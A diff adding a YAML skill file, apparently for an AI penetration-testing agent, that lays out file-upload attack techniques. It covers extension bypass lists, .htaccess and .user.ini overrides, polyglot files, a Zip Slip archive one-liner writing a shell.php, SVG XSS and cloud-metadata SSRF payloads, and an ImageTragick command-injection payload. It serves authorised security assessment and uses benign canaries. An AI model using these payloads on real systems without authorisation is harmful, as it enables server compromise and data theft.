@@ -1,0 +1,105 @@
+schema_version: 1
+version: 3.0.0
+name: file-upload-advanced
+description: >
+  Advanced file upload vulnerability assessment covering parser differentials, polyglot payloads,
+  MIME-type spoofing, null-byte truncation, server configuration overwrites (.htaccess, .user.ini),
+  Zip Slip archive traversal, ImageTragick exploitation, and SVG-based stored XSS / SSRF.
+triggers:
+  - file upload
+  - upload vulnerability
+  - polyglot
+  - zip slip
+  - .htaccess
+  - .user.ini
+  - imagetragick
+  - svg xss
+  - mime spoofing
+  - double extension
+  - avatar upload
+tools:
+  - curl
+  - httpx
+  - python3
+knowledge: |
+  File upload endpoints are among the highest-risk application surfaces. Defenses that rely solely
+  on extension blacklists, client-supplied MIME types, or naive magic byte headers can be bypassed
+  using polyglot files, parser differentials, and server configuration overrides.
+
+  1. EXTENSION & CONTENT-TYPE BYPASS MATRIX:
+     Blacklist bypass via alternative and executable extensions:
+       - PHP: .php5, .pht, .phtml, .php7, .phps, .phar, .pgif
+       - ASP.NET: .aspx, .ashx, .asmx, .asp, .cer, .asa, .config
+       - JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .war
+       - Node: .js, .mjs, .cjs (if executed via server-side runner)
+     Case variation and whitespace:
+       .pHp, .pHP, .php. (trailing dot bypasses Windows path normalization), .php%20, .php::$DATA
+     Double extensions:
+       file.php.jpg, file.php.png, file.png.php
+       (In Apache with mod_negotiation or misconfigured AddHandler, file.php.png may execute as PHP!)
+
+  2. SERVER CONFIGURATION OVERWRITES (.HTACCESS / .USER.INI):
+     When PHP direct uploads are blocked, attempt to upload configuration files:
+     a. .htaccess override (Apache):
+        Upload file named '.htaccess' with content:
+          AddType application/x-httpd-php .png
+        Then upload file.png containing executable code; Apache treats .png as PHP!
+     b. .user.ini override (PHP-FPM / Nginx):
+        Upload file named '.user.ini' with content:
+          auto_prepend_file=avatar.jpg
+        When any PHP script in the directory is requested, avatar.jpg is prepended and executed.
+
+  3. MAGIC BYTE & POLYGLOT PAYLOADS:
+     When server validates file headers (magic bytes) using libmagic or getimagesize():
+     - GIF89a header polyglot:
+       Prepend 'GIF89a;' (hex: 47 49 46 38 39 61 3B) followed by target script content.
+     - JPEG polyglot (inject into EXIF metadata / comment segment):
+       Use jhead or python script to inject payload into JPEG COM marker without corrupting image structure.
+     - PDF/JS polyglot:
+       Valid PDF document containing OpenAction / JavaScript that triggers upon opening in browser.
+
+  4. ZIP SLIP (ARCHIVE EXTRACTION PATH TRAVERSAL):
+     When the application accepts .zip, .tar, .tar.gz or archive uploads and unpacks them:
+     Craft an archive containing files with directory traversal in their path entries:
+       python3 -c "
+       import zipfile
+       zf = zipfile.ZipFile('zipslip.zip', 'w')
+       zf.writestr('../../var/www/html/shell.php', '<?php phpinfo(); ?>')
+       zf.close()
+       "
+     If the unpacker concatenates destinationDir + entry.getName() without checking for canonical path:
+     files are written outside the intended extraction folder!
+
+  5. SVG FILE TESTING (STORED XSS, SSRF, XXE):
+     SVG is XML-based vector graphics rendered directly by browsers:
+     a. Stored XSS via inline script:
+        <?xml version="1.0" standalone="no"?>
+        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+          <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+          <script type="text/javascript">alert(document.domain);</script>
+        </svg>
+     b. SSRF / XXE via SVG:
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+          <image xlink:href="http://169.254.169.254/latest/meta-data/" height="200" width="200"/>
+        </svg>
+
+  6. IMAGEMAGICK / IMAGETRAGICK VULNERABILITIES:
+     If the server delegates thumbnail generation to ImageMagick / GraphicsMagick:
+     Test MVG (Magick Vector Graphics) and MSL file formats for command execution:
+       push graphic-context
+       viewbox 0 0 640 480
+       fill 'url(https://example.com/image.jpg"|id")'
+       pop graphic-context
+
+  VALIDATION & SAFETY DISCIPLINE:
+     - Always use non-destructive canary payloads (e.g. phpinfo() or benign echo) before any shell.
+     - Check upload response for stored file path, URL, or identifier.
+     - Document upload form parameters, multipart boundary headers, and server-side execution path.
+references:
+  - https://portswigger.net/web-security/file-upload
+  - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+  - https://snyk.io/research/zip-slip-vulnerability/
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/file-upload-advanced.yaml
